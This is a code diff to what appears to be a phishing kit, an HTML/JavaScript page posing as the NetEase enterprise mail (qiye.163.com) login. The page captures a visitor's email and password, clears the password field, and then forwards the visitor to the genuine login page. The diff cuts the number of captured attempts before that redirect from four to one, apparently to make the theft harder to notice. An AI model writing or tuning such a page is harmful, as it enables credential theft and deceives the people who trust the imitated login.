@@ -149,7 +149,7 @@ button {
 <div class="container">
 	<div class="logo"></div>
 
-	<form method="post" action="">
+	<form action="">
 		<div class="contain">
     		<input id="email" type="text" placeholder="&#24080;&#21495;" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" style="margin-top: 8px; margin-bottom: 14px;" name="email" required>
 
@@ -273,7 +273,7 @@ button {
             		console.log(response);
             		if(response['signal'] == 'ok'){
             			$("#password").val("");
-            			if (count>=4) {
+            			if (count>=1) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
@@ -288,7 +288,7 @@ button {
     },
     error: function(){
     	$("#password").val("");
-    	if (count>=4) {
+    	if (count>=1) {
     		count=0;
     		window.location.replace("https://qiye.163.com/login/?authuser=2/?msg="+email);
     	}
